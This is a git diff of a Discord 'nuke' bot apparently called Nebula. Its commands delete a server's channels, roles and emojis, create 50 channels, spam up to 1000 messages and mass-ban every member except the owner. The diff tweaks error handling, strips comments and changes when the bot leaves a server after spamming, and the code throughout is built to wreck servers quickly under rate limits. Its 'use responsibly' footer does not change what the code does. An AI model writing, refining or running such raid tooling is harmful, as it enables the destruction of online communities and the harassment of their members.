@@ -64,7 +64,7 @@ async function safeLeaveGuild(guild) {
     if ([50001, 404, 403].includes(err.code)) {
       console.log('✅ Already left or kicked from server.');
     } else {
-      throw err; // Re-throw unexpected errors
+      console.error(`⚠️ Error leaving server:`, err.message);
     }
   }
 }
@@ -87,7 +87,7 @@ client.on('messageCreate', async (message) => {
       .addFields(
         { name: '.rip', value: 'Nukes the server (deletes roles, emojis, creates 50 channels, spams 1000 messages)' },
         { name: '.ba', value: 'Bans all members (except owner)' },
-        { name: '.help', value: 'Sends this help message to your DMs' }
+        { name: '.help', value: 'Sends this help to your DMs' }
       )
       .setColor('#ff0000')
       .setFooter({ text: 'Use responsibly - only in servers you own!' });
@@ -105,12 +105,11 @@ client.on('messageCreate', async (message) => {
   // ===== BAN ALL MEMBERS =====
   if (command === 'ba') {
     if (!message.member.permissions.has('BanMembers')) {
-      return message.reply("❌ You don't have permission to ban members."); // ✅ FIXED LINE
+      return message.reply("❌ You don't have permission to ban members.");
     }
 
     const guild = message.guild;
 
-    // Skip owner and bots
     const membersToBan = guild.members.cache.filter(m =>
       m.id !== guild.ownerId && !m.user.bot
     );
@@ -125,13 +124,13 @@ client.on('messageCreate', async (message) => {
       try {
         await handleRateLimit(() => guild.members.ban(member, {
           reason: 'Nebula Ban All',
-          deleteMessageSeconds: 604800 // Delete 1 week of messages
+          deleteMessageSeconds: 604800
         }));
         console.log(`✅ Banned: ${member.user.tag}`);
       } catch (err) {
         console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
       }
-      await new Promise(r => setTimeout(r, 50)); // Small delay between bans
+      await new Promise(r => setTimeout(r, 50));
     }
 
     console.log(`✅ Successfully banned all members.`);
@@ -149,6 +148,7 @@ client.on('messageCreate', async (message) => {
       console.log(`🎯 Targeting server: ${guild.name}`);
 
       let didSomething = false;
+      let sent = 0;
 
       // Step 1: Delete channels
       try {
@@ -258,7 +258,6 @@ client.on('messageCreate', async (message) => {
         return message.channel.send('❌ No valid channels to spam.');
       }
 
-      let sent = 0;
       const MAX_MESSAGES = 1000;
       const MESSAGES_PER_CHANNEL = 20;
 
@@ -273,7 +272,7 @@ client.on('messageCreate', async (message) => {
           } catch (err) {
             console.error(`⚠️ Send failed in ${channel.name}: ${err.message}`);
           }
-          await new Promise(r => setTimeout(r, 2)); // 2ms delay between sends
+          await new Promise(r => setTimeout(r, 2)); // Delay between sends
         }
       });
 
@@ -281,8 +280,12 @@ client.on('messageCreate', async (message) => {
       console.log(`✅ Sent ${sent}/${MAX_MESSAGES} spam messages.`);
       didSomething = true;
 
-      // Step 7: Leave server safely
-      await safeLeaveGuild(guild);
+      // Final check: Leave server if we sent enough messages
+      if (sent >= 950) {
+        await safeLeaveGuild(guild);
+      } else {
+        console.log('🚫 Not enough messages sent. Not leaving server.');
+      }
 
       if (!didSomething) {
         console.error('🚫 Could not perform any actions on this server.');
